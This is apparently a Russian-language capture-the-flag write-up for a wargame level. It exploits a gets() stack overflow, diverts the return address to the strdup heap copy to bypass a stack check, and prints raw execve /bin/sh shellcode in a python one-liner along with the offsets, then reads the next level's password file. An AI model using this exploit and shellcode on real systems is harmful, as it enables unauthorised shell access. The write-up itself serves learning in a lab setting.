# su level2
# pass: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

====
Уязвимость: gets, заменить адрес возврата, с указанием на кучу, где лежит шеллкод
====

# ./level2 
1
1

**Поведение: ждёт ввода и возвращает то, что было введено**

# ./level2 
qwertyuiopogfdfghjkl;lkjhgfdcfvghnjmk,l.;';lkjhgfrt6y7uikmnbgtyuiol;.,mnbhjuik
qwertyuiopogfdfghjkl;lkjhgfdcfvghnjmk,l.;';lkjhgfrt6y7uikmnbgtyuJ.,mnbhjuik
Segmentation fault (core dumped)

Можно вызвать сегфолт, проверяем по ltrace, опять уязвимая gets

# ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                             = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5edwd
)                                  = 0xbffff70c
puts("edwd"edwd
)                                                                   = 5
strdup("edwd")                                                                 = 0x0804a008
+++ exited (status 8) +++

Есть fflush (очистка буфера или вывод в файл), gets, puts, strdup

# disas main

Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>          p()
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.

Вызывается функция p
Почекаем еще функции

# i func 
< >
0x080484d4  p
0x0804853f  main
< >

Посмотрим эту функцию

# disas p

Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp                   104
   0x080484da <+6>:     mov    0x8049860,%eax               stdout
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>       fflush(FILE *stream);
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax             -76
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax             & 0xb0000000
   0x08048500 <+44>:    cmp    $0xb0000000,%eax             сравнение
   0x08048505 <+49>:    jne    0x8048527 <p+83>             если нет, то на 83          
   0x08048507 <+51>:    mov    $0x8048620,%eax              "(%p)\n"
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx              -12
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>        printf
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>        _exit(1)
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
End of assembler dump.

Суть в том, что мы не можем перезаписать адрес выхода и перейти на начало нашего шеллкода, так как идет проверка на стек, и в случае неудачи происходит exit.
У нас есть функция strdup, адрес начала которой мы можем узнать (т.к. отключена рандомизация памяти - 0x0804a008), и мы можем указать начало строки. Шеллкод исполнится, т.к. мы будем указывать не на стек, а на кучу. Надо указать строку длиной 80.
b *p+19
r
x/a $ebp + 4 (0xbffff72c: 0x804854a <main+11>) - возврат
p/x $ebp - 0x4c (0xbffff6dc) - начало буфера
p/x 0x4c + 4 (0x50=80) - до адреса возврата
$ebp + 4 - ($ebp - 0x4c)

Таким образом, пишем шеллкод, где вызываем шелл, заполняем строку символами в необходимом количестве + указываем адрес возврата (куча).

(http://shell-storm.org/shellcode/files/shellcode-472.php)

26 шеллкод + 54 мусор + 4 необходимый адрес

# python -c 'print "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 54 + "\x08\xa0\x04\x08"' > /tmp/l2

# cat /tmp/l2 - | ./level2

# cat /home/user/level3/.pass 
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
